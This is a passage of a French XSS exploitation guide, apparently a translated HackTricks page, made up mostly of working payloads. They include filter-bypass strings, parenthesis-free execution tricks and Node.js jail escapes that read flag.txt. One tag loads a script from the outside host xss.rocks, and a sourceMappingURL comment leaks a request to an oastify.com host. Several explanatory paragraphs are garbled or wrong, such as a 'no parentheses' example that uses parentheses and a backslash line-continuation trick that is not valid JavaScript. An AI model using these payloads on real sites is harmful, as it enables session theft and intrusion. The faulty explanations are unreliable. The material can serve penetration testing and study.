> \#someid {top: 0; font-family: Tahoma;}

Maintenant, vous pouvez modifier notre lien et le mettre sous la forme suivante :

> \<a href=”” id=someid class=test onclick=alert() a=””>

Cette astuce a été tirée de [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Injection dans le code JavaScript

Dans ce cas, votre **entrée** sera **réfléchie dans le code JS** d'un fichier `.js` ou entre les balises `<script>...</script>` ou entre les événements HTML qui peuvent exécuter du code JS ou entre les attributs qui acceptent le protocole `javascript:`.

### Échapper à la balise \<script>

Si votre code est inséré dans `<script> [...] var input = 'données réfléchies' [...] </script>`, vous pouvez facilement **échapper à la fermeture de la balise `<script>`** :
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Notez que dans cet exemple, nous **n'avons même pas fermé l'apostrophe**, mais ce n'est pas nécessaire car le **navigateur effectue d'abord l'analyse HTML** pour identifier les éléments de la page, y compris les blocs de script, et n'effectue que plus tard l'analyse JavaScript pour comprendre et exécuter les scripts intégrés.

### À l'intérieur du code JS

Si `<>` sont en cours de désinfection, vous pouvez toujours **échapper la chaîne** là où votre entrée est **localisée** et **exécuter du JS arbitraire**. Il est important de **corriger la syntaxe JS**, car en cas d'erreurs, le code JS ne sera pas exécuté :
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
### Modèles littéraux \`\`

Afin de construire des **chaînes de caractères** en dehors des guillemets simples et doubles, JS accepte également les **backticks** **` `` `**. Cela est connu sous le nom de modèles littéraux car ils permettent d'**intégrer des expressions JS** en utilisant la syntaxe `${ ... }`.\
Par conséquent, si vous constatez que votre entrée est **réfléchie** à l'intérieur d'une chaîne JS qui utilise des backticks, vous pouvez exploiter la syntaxe `${ ... }` pour exécuter du **code JS arbitraire** :

Cela peut être **exploité** en utilisant :
```javascript
`${alert(1)}`
`${`${`${`${alert(1)}`}`}`}`
```

```````````````javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop(){return loop}
loop``````````````
```````````````
### Exécution de code encodé

L'exécution de code encodé est une technique couramment utilisée dans les attaques de type Cross-Site Scripting (XSS). Elle consiste à encoder le code malveillant de manière à contourner les filtres de sécurité et à exécuter du code sur le navigateur de la victime.

L'objectif principal de cette technique est de tromper les filtres de sécurité qui analysent le contenu des requêtes et des réponses HTTP. En encodant le code malveillant, il devient plus difficile pour les filtres de détecter et de bloquer le code dangereux.

Il existe plusieurs méthodes d'encodage couramment utilisées, telles que l'encodage HTML, l'encodage URL, l'encodage JavaScript, etc. Chaque méthode a ses propres caractéristiques et est utilisée en fonction du contexte de l'attaque.

Lors de l'exploitation de cette technique, l'attaquant insère du code malveillant encodé dans une application Web vulnérable. Lorsque la victime accède à la page contenant le code encodé, le navigateur interprète le code et l'exécute, ce qui peut entraîner des conséquences néfastes telles que le vol de données sensibles, la prise de contrôle de session, etc.

Pour se protéger contre les attaques d'exécution de code encodé, il est essentiel de mettre en place des mécanismes de sécurité appropriés, tels que la validation et l'échappement des entrées utilisateur, la mise en œuvre de listes blanches pour les caractères autorisés, l'utilisation de bibliothèques de sécurité pour le rendu des données, etc.

Il est également recommandé de sensibiliser les développeurs et les utilisateurs aux risques liés aux attaques XSS et de mettre en place des pratiques de développement sécurisées pour réduire les vulnérabilités potentielles.
```markup
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</iframe>">
```
### Encodage Unicode pour l'exécution de JS

---

#### Description

L'encodage Unicode est une technique utilisée pour contourner les filtres de sécurité et exécuter du code JavaScript malveillant sur une application web. Cette technique exploite les vulnérabilités de sécurité liées à la manipulation incorrecte des caractères Unicode par l'application.

Lorsqu'une application web ne traite pas correctement les caractères Unicode, il est possible d'insérer des séquences spécifiques de caractères qui seront interprétées comme du code JavaScript par le navigateur. Cela permet à un attaquant d'exécuter du code arbitraire sur le navigateur de la victime, ce qui peut entraîner des conséquences graves telles que le vol de données sensibles ou la prise de contrôle de l'application.

---

#### Comment l'exploiter

Pour exploiter cette vulnérabilité, l'attaquant doit identifier les points d'injection de code JavaScript sur l'application web cible. Ces points peuvent être des champs de saisie, des paramètres d'URL ou d'autres zones où l'application accepte des entrées de l'utilisateur.

Une fois que l'attaquant a identifié un point d'injection, il peut utiliser des séquences de caractères Unicode spécifiques pour encoder le code JavaScript malveillant. Par exemple, l'attaquant peut utiliser l'encodage Unicode pour contourner les filtres de sécurité qui bloquent les balises `<script>`.

Voici un exemple d'encodage Unicode pour exécuter une alerte JavaScript :

```html
<script>
    var payload = "\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0027XSS\u0027\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e";
    eval(payload);
</script>
```

Dans cet exemple, le code JavaScript `<script>alert('XSS')</script>` est encodé en utilisant l'encodage Unicode. Lorsque le navigateur interprète cette séquence de caractères, il exécute le code JavaScript et affiche une alerte avec le message "XSS".

---

#### Comment se protéger

Pour se protéger contre les attaques d'encodage Unicode, il est essentiel de mettre en place des mécanismes de validation et de filtrage appropriés pour toutes les entrées utilisateur. Voici quelques bonnes pratiques à suivre :

- Utilisez des bibliothèques de sécurité qui fournissent des fonctions d'échappement pour les caractères spéciaux.
- Validez et filtrez toutes les entrées utilisateur pour détecter et bloquer les séquences de caractères Unicode malveillantes.
- Mettez en œuvre une politique de sécurité qui limite l'utilisation de certaines balises ou caractères spéciaux dans les entrées utilisateur.
- Effectuez régulièrement des tests de sécurité, y compris des tests de pénétration, pour identifier et corriger les vulnérabilités potentielles.

En suivant ces bonnes pratiques, vous pouvez réduire considérablement le risque d'exploitation des vulnérabilités d'encodage Unicode et renforcer la sécurité de votre application web.
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
### Techniques de contournement des listes noires JavaScript

**Chaînes de caractères**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Échappements spéciaux**
```javascript
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
// Any other char escaped is just itself
```
**Substitutions d'espaces à l'intérieur du code JS**

Lors de l'exploitation de vulnérabilités de type Cross-Site Scripting (XSS), il est parfois nécessaire de contourner les filtres de sécurité qui bloquent les caractères spéciaux. Une technique couramment utilisée consiste à effectuer des substitutions d'espaces dans le code JavaScript afin de tromper les filtres et d'exécuter du code malveillant.

Les filtres de sécurité peuvent être configurés pour bloquer les caractères spéciaux tels que les chevrons (< et >), les guillemets (", '), les parenthèses ((), []), etc. Cependant, ils peuvent ne pas être configurés pour bloquer les espaces. En exploitant cette faiblesse, il est possible d'insérer du code JavaScript malveillant en utilisant des substitutions d'espaces.

Voici quelques exemples de substitutions d'espaces couramment utilisées :

- `&#x20;` : représente un espace en notation HTML hexadécimale.
- `&#32;` : représente un espace en notation décimale HTML.
- `%20` : représente un espace en notation URL encodée.
- `\u0020` : représente un espace en notation Unicode.

Lors de l'injection de code malveillant, il est important de tester différentes substitutions d'espaces pour contourner les filtres de sécurité. Il est également recommandé d'utiliser des outils automatisés de test d'injection XSS pour identifier les vulnérabilités et les failles potentielles.

Il convient de noter que l'exploitation de vulnérabilités XSS est illégale sans autorisation préalable. Les techniques décrites ici doivent être utilisées à des fins éducatives et éthiques dans le cadre d'un test de pénétration autorisé.
```javascript
<TAB>
/**/
```
**Commentaires JavaScript (à partir de la technique des** [**Commentaires JavaScript**](./#commentaires-javascript) **)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**Sauts de ligne JavaScript (à partir de la** [**technique de saut de ligne JavaScript**](./#javascript-new-lines) **)**

---

When injecting JavaScript code into a web application, it is important to understand how new lines are handled. In some cases, new lines can be used to bypass input filters and execute malicious code.

Lors de l'injection de code JavaScript dans une application web, il est important de comprendre comment les sauts de ligne sont gérés. Dans certains cas, les sauts de ligne peuvent être utilisés pour contourner les filtres de saisie et exécuter du code malveillant.

---

Consider the following example:

Considérez l'exemple suivant :

```html
<script>
var name = "John";
alert(name);
</script>
```

In this case, the JavaScript code will execute without any issues. However, if we introduce a new line character, the code will break and an error will occur:

Dans ce cas, le code JavaScript s'exécutera sans problème. Cependant, si nous introduisons un caractère de saut de ligne, le code se cassera et une erreur se produira :

```html
<script>
var name = "John";
alert
(name);
</script>
```

To bypass this issue, we can use the JavaScript new line trick. By adding a backslash (`\`) at the end of the line, we can continue the code on the next line:

Pour contourner ce problème, nous pouvons utiliser la technique du saut de ligne JavaScript. En ajoutant un antislash (`\`) à la fin de la ligne, nous pouvons continuer le code sur la ligne suivante :

```html
<script>
var name = "John";
alert\
(name);
</script>
```

This way, the code will execute successfully, even with the new line character.

De cette façon, le code s'exécutera avec succès, même avec le caractère de saut de ligne.

---

It is important to note that this trick may not work in all scenarios, as it depends on how the web application handles new lines. Additionally, it is crucial to use this technique responsibly and only for legitimate purposes, such as penetration testing or security research.

Il est important de noter que cette astuce peut ne pas fonctionner dans tous les scénarios, car cela dépend de la façon dont l'application web gère les sauts de ligne. De plus, il est crucial d'utiliser cette technique de manière responsable et uniquement à des fins légitimes, telles que les tests de pénétration ou la recherche en sécurité.
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10); alert('//\nalert(1)') //0x0a
String.fromCharCode(13); alert('//\ralert(1)') //0x0d
String.fromCharCode(8232); alert('//\u2028alert(1)') //0xe2 0x80 0xa8
String.fromCharCode(8233); alert('//\u2029alert(1)') //0xe2 0x80 0xa9
```
**Espaces blancs en JavaScript**

Les espaces blancs en JavaScript se réfèrent aux caractères non imprimables tels que les espaces, les tabulations et les sauts de ligne. Ces espaces blancs sont généralement ignorés par l'interpréteur JavaScript lors de l'exécution du code.

Cependant, dans le contexte de la sécurité, les espaces blancs peuvent être utilisés de manière malveillante pour contourner les filtres de sécurité et exécuter du code JavaScript non autorisé. Cette technique est connue sous le nom d'obfuscation de code.

L'obfuscation de code consiste à ajouter des espaces blancs supplémentaires ou à les réorganiser de manière à rendre le code JavaScript illisible pour les humains, tout en restant exécutable par l'interpréteur JavaScript.

Il est important de noter que l'obfuscation de code n'est pas une technique de piratage en soi, mais plutôt une méthode utilisée par les attaquants pour masquer leur code malveillant et échapper à la détection.

Lors de l'audit de sécurité d'une application web, il est essentiel de prendre en compte les espaces blancs et de les analyser attentivement pour détecter toute tentative d'obfuscation de code.
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript à l'intérieur d'un commentaire**

Lors de l'audit d'une application web, il est important de vérifier si le code JavaScript est correctement filtré et sécurisé. Une technique courante utilisée par les attaquants est d'insérer du code JavaScript malveillant à l'intérieur de commentaires HTML.

Cela peut sembler anodin, car les commentaires sont généralement ignorés par les navigateurs. Cependant, si le code JavaScript à l'intérieur d'un commentaire est exécuté par le navigateur, il peut causer des dommages importants.

Pour vérifier si une application est vulnérable à cette attaque, vous pouvez insérer du code JavaScript dans un commentaire et voir s'il est exécuté. Par exemple :

```html
<!-- <script>alert('XSS')</script> -->
```

Si vous voyez une alerte s'afficher, cela signifie que le code JavaScript à l'intérieur du commentaire est exécuté. Cela peut être exploité par un attaquant pour voler des informations sensibles, rediriger les utilisateurs vers des sites malveillants ou exécuter d'autres actions malveillantes.

Pour prévenir cette vulnérabilité, assurez-vous de filtrer et d'échapper correctement les commentaires HTML pour empêcher l'exécution de code JavaScript à l'intérieur d'eux.
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript sans parenthèses**

L'une des techniques couramment utilisées en XSS (Cross-Site Scripting) consiste à exécuter du code JavaScript sans utiliser de parenthèses. Cette technique est souvent utilisée pour contourner les filtres de sécurité et injecter du code malveillant dans une application web.

L'idée principale derrière cette technique est d'exploiter les contextes où le code JavaScript peut être exécuté sans l'utilisation de parenthèses. Par exemple, dans certains cas, le code JavaScript peut être exécuté directement dans une balise HTML sans avoir besoin de les entourer de parenthèses.

Voici un exemple de code JavaScript sans parenthèses :

```javascript
<script>
  var payload = 'alert("XSS")';
  eval(payload);
</script>
```

Dans cet exemple, le code JavaScript `alert("XSS")` est exécuté directement sans l'utilisation de parenthèses. Cela peut être utilisé pour exécuter du code malveillant sur le navigateur de la victime.

Il est important de noter que cette technique peut être détectée et bloquée par des mécanismes de sécurité appropriés, tels que la validation et l'échappement des entrées utilisateur. Cependant, il est toujours essentiel de prendre des mesures pour prévenir les attaques XSS en appliquant des bonnes pratiques de sécurité dans le développement d'applications web.
````javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x```

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.
````
* [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
* [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Appel de fonction arbitraire (alert)**
````javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
````
## **Vulnérabilités DOM**

Il existe du **code JS** qui utilise des **données contrôlées par un attaquant** de manière non sécurisée, comme `location.href`. Un attaquant pourrait exploiter cela pour exécuter du code JS arbitraire.\
**En raison de l'extension de l'explication des** [**vulnérabilités DOM, elle a été déplacée vers cette page**](dom-xss.md)**:**

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

Vous y trouverez une **explication détaillée de ce que sont les vulnérabilités DOM, comment elles sont provoquées et comment les exploiter**.\
N'oubliez pas non plus qu'à la fin de l'article mentionné, vous trouverez une explication sur les [**attaques de clobbering DOM**](dom-xss.md#dom-clobbering).

## Autres contournements

### Unicode normalisé

Vous pouvez vérifier si les **valeurs réfléchies** sont **normalisées en Unicode** sur le serveur (ou côté client) et exploiter cette fonctionnalité pour contourner les protections. [**Trouvez un exemple ici**](../unicode-injection/#xss-cross-site-scripting).

### Contournement du drapeau PHP FILTER\_VALIDATE\_EMAIL
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Contournement de Ruby-On-Rails

En raison de la **vulnérabilité d'attribution de masse de RoR**, des guillemets sont insérés dans le HTML, puis la restriction des guillemets est contournée et des champs supplémentaires (onfocus) peuvent être ajoutés à l'intérieur de la balise.\
Par exemple, dans ce [rapport](https://hackerone.com/reports/709336), si vous envoyez la charge utile suivante :
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
La paire "Clé","Valeur" sera renvoyée comme ceci :
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
Ensuite, l'attribut onfocus sera inséré :

![](<../../.gitbook/assets/image (107).png>)

Une XSS se produit.

### Combinaisons spéciales
```markup
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
```
### XSS avec injection d'en-tête dans une réponse 302

Si vous découvrez que vous pouvez **injecter des en-têtes dans une réponse de redirection 302**, vous pouvez essayer de **faire exécuter du code JavaScript arbitraire par le navigateur**. Cela n'est **pas trivial** car les navigateurs modernes n'interprètent pas le corps de la réponse HTTP si le code de statut de la réponse HTTP est 302, donc une charge utile de cross-site scripting est inutile.

Dans [**ce rapport**](https://www.gremwell.com/firefox-xss-302) et [**celui-ci**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/), vous pouvez lire comment tester plusieurs protocoles à l'intérieur de l'en-tête Location et voir si l'un d'entre eux permet au navigateur d'inspecter et d'exécuter la charge utile XSS à l'intérieur du corps.\
Protocoles connus : `mailto://`, `//x:1/`, `ws://`, `wss://`, en-tête Location vide, `resource://`.

### Uniquement des lettres, des chiffres et des points

Si vous êtes en mesure d'indiquer la **fonction de rappel** que JavaScript va **exécuter**, limitée à ces caractères. [**Lisez cette section de cet article**](./#javascript-function) pour savoir comment exploiter ce comportement.

### Types de contenu `<script>` valides pour XSS

(À partir de [**ici**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Si vous essayez de charger un script avec un **type de contenu** tel que `application/octet-stream`, Chrome affichera l'erreur suivante :

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Les seuls **types de contenu** qui permettront à Chrome d'exécuter un script chargé sont ceux présents dans la constante **`kSupportedJavascriptTypes`** de [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Types de script pour XSS

(À partir de [**ici**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Alors, quels types peuvent être indiqués pour charger un script ?
```html
<script type="???"></script>
```
La réponse est :

* **module** (par défaut, rien à expliquer)
* [**webbundle**](https://web.dev/web-bundles/) : Les Web Bundles sont une fonctionnalité qui vous permet de regrouper un ensemble de données (HTML, CSS, JS...) dans un fichier **`.wbn`**.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
* [**importmap**](https://github.com/WICG/import-maps)**:** Permet d'améliorer la syntaxe d'importation
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment";
import { partition } from "lodash";
</script>
```
Ce comportement a été utilisé dans [**ce compte rendu**](https://github.com/zwade/yaca/tree/master/solution) pour remapper une bibliothèque à eval afin de l'exploiter et de déclencher une XSS.

* [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Cette fonctionnalité vise principalement à résoudre certains problèmes causés par le pré-rendu. Elle fonctionne de la manière suivante :
```html
<script type="speculationrules">
{
"prerender": [
{"source": "list",
"urls": ["/page/2"],
"score": 0.5},
{"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1}
]
}
</script>
```
### Types de contenu Web pour XSS

(À partir de [**ici**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Les types de contenu suivants peuvent exécuter XSS dans tous les navigateurs :

* text/html
* application/xhtml+xml
* application/xml
* text/xml
* image/svg+xml
* text/plain (?? pas dans la liste mais je pense l'avoir vu dans un CTF)
* application/rss+xml (off)
* application/atom+xml (off)

Dans d'autres navigateurs, d'autres **`Types de contenu`** peuvent être utilisés pour exécuter du JS arbitraire, vérifiez : [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### Type de contenu xml

Si la page renvoie un type de contenu text/xml, il est possible d'indiquer un espace de noms et d'exécuter du JS arbitraire :
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Modèles de remplacement spéciaux

Lorsque quelque chose comme **`"des données {{template}}".replace("{{template}}", <user_input>)`** est utilisé. L'attaquant pourrait utiliser des [**remplacements de chaînes spéciales**](https://developer.mozilla.org/fr/docs/Web/JavaScript/Reference/Objets_globaux/String/replace#spécification_d_une_chaîne_comme_remplacement) pour tenter de contourner certaines protections : ``"123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"}))``

Par exemple, dans [**ce compte rendu**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA), cela a été utilisé pour **échapper à une chaîne JSON** à l'intérieur d'un script et exécuter du code arbitraire.

### Chrome Cache to XSS

{% content-ref url="chrome-cache-to-xss.md" %}
[chrome-cache-to-xss.md](chrome-cache-to-xss.md)
{% endcontent-ref %}

### Évasion de XS Jails

Si vous avez seulement un ensemble limité de caractères à utiliser, vérifiez ces autres solutions valides pour les problèmes de XSJail :
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Si **tout est indéfini** avant d'exécuter du code non fiable (comme dans [**ce compte rendu**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#miscx2fundefined55-solves)), il est possible de générer des objets utiles "à partir de rien" pour abuser de l'exécution de code non fiable arbitraire :

* Utilisation de import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then(m=>console.log(m.readFileSync("/flag.txt", "utf8")))
```
* Accès indirect à `require`

[Selon cette source](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050), les modules sont enveloppés par Node.js dans une fonction, comme ceci :
```javascript
(function (exports, require, module, __filename, __dirname) {
// our actual module code
});
```
Par conséquent, si à partir de ce module nous pouvons **appeler une autre fonction**, il est possible d'utiliser `arguments.callee.caller.arguments[1]` depuis cette fonction pour accéder à **`require`**:&#x20;

{% code overflow="wrap" %}
```javascript
(function(){return arguments.callee.caller.arguments[1]("fs").readFileSync("/flag.txt", "utf8")})()
```
{% endcode %}

De manière similaire à l'exemple précédent, il est possible d'utiliser des gestionnaires d'erreurs pour accéder à l'enveloppe du module et obtenir la fonction **`require`** :
